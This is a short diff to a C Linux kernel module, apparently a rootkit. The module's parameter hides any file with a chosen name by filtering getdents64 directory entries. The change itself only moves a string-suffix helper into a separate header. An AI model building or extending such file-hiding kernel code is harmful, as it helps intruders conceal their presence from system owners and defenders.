@@ -22,6 +22,8 @@
 #include <linux/udp.h>
 #include <linux/if_arp.h>
 
+#include "helpers.h"
+
 static char* hide_file_name = "FILE";
 module_param(hide_file_name, charp, S_IRWXU);
 MODULE_PARM_DESC(hide_file_name, "Hide any file that has the name.");
@@ -53,8 +55,6 @@ static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t
 
 
 static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size);
-
-static int ends_with(const char *str, const char *suffix);
 
 struct getdent64_arguments {
     unsigned int fd;
@@ -518,11 +518,3 @@ unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_off
         return count;
     }
 }
-
-int ends_with(const char *str, const char *suffix) {
-    size_t str_len = strlen(str);
-    size_t suffix_len = strlen(suffix);
-  
-    return (str_len >= suffix_len) &&
-           (strncmp(str + str_len - suffix_len, suffix, suffix_len) == 0);
-  }
